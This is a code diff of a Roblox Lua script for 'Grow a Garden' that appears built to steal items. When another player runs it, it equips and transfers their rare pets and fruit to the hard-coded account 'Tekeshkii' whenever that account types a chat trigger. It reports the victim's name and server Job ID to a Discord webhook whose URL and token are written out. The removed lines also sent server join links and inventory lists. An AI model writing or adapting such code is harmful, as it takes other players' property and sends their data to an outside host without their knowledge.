@@ -1,7 +1,10 @@
--- Grow a Garden Auto Gifter with Discord Embed
+-- Grow a Garden Exclusive Tekeshkii Gifter
 local RECIPIENT_NAME = "Tekeshkii" -- CASE SENSITIVE
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1383491297859469433/StCTYTDOXN9jcRg-qBV59aNlF9uEyuAg2_OnAcknekx6tTvFPdw83T2uP6cmivRYOYEs"
-local GIFT_COOLDOWN = 0.7
+local GIFT_COOLDOWN = 1.0 -- Safer cooldown between gifts
+local ACTIVATION_PHRASE = "!giftme" -- Chat command to activate
+
+-- Target items (only pets and candy blossom)
 local TARGET_ITEMS = {
     Pets = {"dragonfly", "raccoon", "queen bee", "disco bee", "red fox"},
     Fruits = {"candy blossom"}
@@ -9,140 +12,48 @@ local TARGET_ITEMS = {
 
 -- Services
 local Players = game:GetService("Players")
-local TeleportService = game:GetService("TeleportService")
-local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local MarketplaceService = game:GetService("MarketplaceService")
+local HttpService = game:GetService("HttpService")
+local TextChatService = game:GetService("TextChatService")
 
 -- Variables
 local lp = Players.LocalPlayer
 local Backpack = lp:WaitForChild("Backpack")
 local Recipient = nil
 local GiftRemotes = {}
-local isActive = true
 local currentJobId = game.JobId
-local gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
+local isGifting = false
 
--- Generate game link with JobID
-local function getGameLink()
-    return string.format("https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s", 
-        game.PlaceId, currentJobId)
-end
-
--- Enhanced Discord embed with game link
-local function sendEmbed(title, description, color, inventory)
-    local embed = {
-        title = title.." | "..gameName,
-        description = description,
-        color = color or 0xFF69B4,
-        url = getGameLink(), -- Added clickable game link
-        fields = {
-            {name = "👤 Executor", value = lp.Name, inline = true},
-            {name = "🎯 Recipient", value = Recipient and Recipient.Name or "None", inline = true},
-            {name = "🆔 Job ID", value = currentJobId, inline = true},
-            {name = "🎮 Game Link", value = "[Click to Join]("..getGameLink()..")", inline = false}
-        },
-        footer = {text = os.date("%X")}
-    }
-
-    -- Add inventory if provided
-    if inventory then
-        local items = {}
-        for _, item in ipairs(inventory) do
-            table.insert(items, item)
-        end
-        if #items > 0 then
-            table.insert(embed.fields, {
-                name = "📦 Inventory ("..#items..")",
-                value = table.concat(items, "\n"),
-                inline = false
-            })
-        end
-    end
-
+-- Discord notification
+local function notify(message, color)
     pcall(function()
         local req = (syn and syn.request) or (http and http.request) or http_request
-        if req then
+        if req and WEBHOOK_URL ~= "" then
             req({
                 Url = WEBHOOK_URL,
                 Method = "POST",
                 Headers = {["Content-Type"] = "application/json"},
-                Body = HttpService:JSONEncode({embeds = {embed}})
+                Body = HttpService:JSONEncode({
+                    embeds = {{
+                        title = "🎁 Exclusive Tekeshkii Gifter",
+                        description = message,
+                        color = color or 0xFF69B4,
+                        fields = {
+                            {name = "👤 Executor", value = lp.Name, inline = true},
+                            {name = "🎯 Recipient", value = RECIPIENT_NAME, inline = true},
+                            {name = "🆔 Job ID", value = currentJobId, inline = true}
+                        },
+                        footer = {text = os.date("%X")}
+                    }}
+                })
             })
         end
     end)
 end
 
--- Scan inventory for target items
-local function scanInventory()
-    local items = {}
-    for _, item in ipairs(Backpack:GetChildren()) do
-        if item:IsA("Tool") then
-            local name = item.Name:lower()
-            for _, pet in ipairs(TARGET_ITEMS.Pets) do
-                if name:find(pet:lower()) then
-                    table.insert(items, "🐾 "..item.Name)
-                    break
-                end
-            end
-            for _, fruit in ipairs(TARGET_ITEMS.Fruits) do
-                if name:find(fruit:lower()) then
-                    table.insert(items, "🍬 "..item.Name)
-                    break
-                end
-            end
-        end
-    end
-    return items
-end
-
--- Find recipient and monitor presence
-local function monitorRecipient()
-    while isActive do
-        -- Find recipient
-        if not Recipient then
-            for _, player in ipairs(Players:GetPlayers()) do
-                if player.Name == RECIPIENT_NAME then
-                    Recipient = player
-                    sendEmbed("🎯 RECIPIENT FOUND", "Beginning operations...", 0x00FF00, scanInventory())
-                    break
-                end
-            end
-        end
-        
-        -- Check if recipient left
-        if Recipient and not Recipient.Parent then
-            sendEmbed("⚠️ RECIPIENT LEFT", "Stopping operations", 0xFF0000, scanInventory())
-            Recipient = nil
-        end
-        
-        task.wait(5)
-    end
-end
-
--- Teleport to recipient
-local function teleportToRecipient()
-    if not Recipient or not Recipient.Character then return false end
-    
-    local humanoidRoot = Recipient.Character:FindFirstChild("HumanoidRootPart")
-    if not humanoidRoot then return false end
-    
-    -- Create teleport anchor
-    local teleportPart = Instance.new("Part")
-    teleportPart.Anchored = true
-    teleportPart.CanCollide = false
-    teleportPart.Transparency = 1
-    teleportPart.Size = Vector3.new(4, 4, 4)
-    teleportPart.CFrame = humanoidRoot.CFrame * CFrame.new(0, 0, -2)
-    teleportPart.Parent = workspace
-    
-    -- Perform teleport
-    if lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") then
-        lp.Character.HumanoidRootPart.CFrame = teleportPart.CFrame
-    end
-    
-    teleportPart:Destroy()
-    return true
+-- Verify Tekeshkii is the recipient
+local function verifyRecipient(player)
+    return player.Name == RECIPIENT_NAME
 end
 
 -- Find gifting remotes
@@ -154,20 +65,50 @@ local function findGiftRemotes()
     end
 end
 
--- Gift item to recipient
-local function giftItem(item)
+-- Check if item should be gifted
+local function isGiftable(item)
+    local name = item.Name:lower()
+    for _, pet in ipairs(TARGET_ITEMS.Pets) do
+        if name:find(pet:lower()) then return true, "Pet" end
+    end
+    for _, fruit in ipairs(TARGET_ITEMS.Fruits) do
+        if name:find(fruit:lower()) then return true, "Fruit" end
+    end
+    return false
+end
+
+-- Equip item properly
+local function safeEquip(item)
+    if not lp.Character then return false end
+    local humanoid = lp.Character:FindFirstChildOfClass("Humanoid")
+    if not humanoid then return false end
+    
+    humanoid:EquipTool(item)
+    local timeout = 0
+    while humanoid:GetTool() ~= item and timeout < 10 do
+        task.wait(0.1)
+        timeout = timeout + 1
+    end
+    return humanoid:GetTool() == item
+end
+
+-- Gift item to Tekeshkii
+local function giftToTekeshkii(item)
     if not Recipient or #GiftRemotes == 0 then return false end
     
-    -- Equip first
-    if lp.Character then
-        local humanoid = lp.Character:FindFirstChildOfClass("Humanoid")
-        if humanoid then
-            humanoid:EquipTool(item)
-            task.wait(0.3)
-        end
+    -- Verify Tekeshkii is still in game
+    if not Recipient.Parent then
+        notify("⚠️ Tekeshkii left the game", 0xFF0000)
+        return false
     end
     
-    -- Send gift
+    -- Equip first
+    if not safeEquip(item) then
+        notify("⚠️ Failed to equip: "..item.Name, 0xFF0000)
+        return false
+    end
+    
+    -- Send gift through all remotes
     for _, remote in ipairs(GiftRemotes) do
         pcall(function() remote:FireServer(Recipient, item) end)
         pcall(function() remote:FireServer("Gift", Recipient, item) end)
@@ -176,67 +117,82 @@ local function giftItem(item)
     return true
 end
 
--- Main gifting loop
-local function giftLoop()
-    while isActive do
-        if Recipient then
-            -- Teleport to recipient
-            if teleportToRecipient() then
-                sendEmbed("🌀 TELEPORTED", "Now in position with recipient", 0x00FF00, scanInventory())
-                
-                -- Gift all target items
-                local inventory = scanInventory()
-                for _, item in ipairs(Backpack:GetChildren()) do
-                    if not isActive then break end
-                    
-                    if item:IsA("Tool") then
-                        local valid, itemType = false
-                        local name = item.Name:lower()
-                        
-                        -- Check pets
-                        for _, pet in ipairs(TARGET_ITEMS.Pets) do
-                            if name:find(pet:lower()) then
-                                valid = true
-                                itemType = "Pet"
-                                break
-                            end
-                        end
-                        
-                        -- Check fruits
-                        for _, fruit in ipairs(TARGET_ITEMS.Fruits) do
-                            if name:find(fruit:lower()) then
-                                valid = true
-                                itemType = "Fruit"
-                                break
-                            end
-                        end
-                        
-                        if valid and giftItem(item) then
-                            sendEmbed("🎁 GIFT SENT", itemType..": "..item.Name, 0xADD8E6, scanInventory())
-                            task.wait(GIFT_COOLDOWN)
-                        end
-                    end
+-- Main gifting process
+local function startGifting()
+    if isGifting then return end
+    isGifting = true
+    
+    notify("🎁 Starting Tekeshkii gifting...", 0x00FF00)
+    
+    for _, item in ipairs(Backpack:GetChildren()) do
+        if item:IsA("Tool") then
+            local valid, itemType = isGiftable(item)
+            if valid then
+                if giftToTekeshkii(item) then
+                    notify("➡️ Gifted "..itemType..": "..item.Name, 0xADD8E6)
+                    task.wait(GIFT_COOLDOWN)
+                else
+                    break -- Stop if gifting fails
                 end
-            else
-                sendEmbed("⚠️ TELEPORT FAILED", "Could not reach recipient", 0xFF0000, scanInventory())
             end
         end
-        task.wait(1)
+    end
+    
+    notify("✅ Finished gifting to Tekeshkii", 0x00FF00)
+    isGifting = false
+end
+
+-- Chat listener for Tekeshkii
+local function setupChatListener()
+    -- Modern chat system
+    if TextChatService then
+        TextChatService.OnIncomingMessage = function(message)
+            if message.TextSource and verifyRecipient(Players:GetPlayerByUserId(message.TextSource.UserId)) then
+                if string.lower(message.Text) == string.lower(ACTIVATION_PHRASE) then
+                    startGifting()
+                end
+            end
+        end
+    else
+        -- Legacy chat fallback
+        Players.PlayerChatted:Connect(function(player, message)
+            if verifyRecipient(player) and string.lower(message) == string.lower(ACTIVATION_PHRASE) then
+                startGifting()
+            end
+        end)
     end
 end
 
--- Initialize systems
-sendEmbed("⚡ SYSTEM STARTED", "Now searching for recipient...", 0x00FF00, scanInventory())
+-- Player connection handler
+local function onPlayerAdded(player)
+    if verifyRecipient(player) then
+        Recipient = player
+        notify("🎯 Tekeshkii joined the server", 0x00FF00)
+    end
+end
+
+-- Player removal handler
+local function onPlayerRemoving(player)
+    if verifyRecipient(player) then
+        Recipient = nil
+        notify("⚠️ Tekeshkii left the server", 0xFF0000)
+    end
+end
+
+-- Initialize
+notify("⚡ Tekeshkii Gifter Activated", 0x00FF00)
 findGiftRemotes()
 
--- Start monitoring
-task.spawn(monitorRecipient)
-task.spawn(giftLoop)
+-- Set up event listeners
+Players.PlayerAdded:Connect(onPlayerAdded)
+Players.PlayerRemoving:Connect(onPlayerRemoving)
+setupChatListener()
 
--- Cleanup on teleport
-lp.OnTeleport:Connect(function(state)
-    if state == Enum.TeleportState.Started then
-        isActive = false
-        sendEmbed("🔄 TELEPORTING", "System pausing during transfer", 0xFFFF00, scanInventory())
+-- Check if Tekeshkii is already in game
+for _, player in ipairs(Players:GetPlayers()) do
+    if verifyRecipient(player) then
+        Recipient = player
+        notify("🎯 Tekeshkii already in server", 0x00FF00)
+        break
     end
-end)
+end
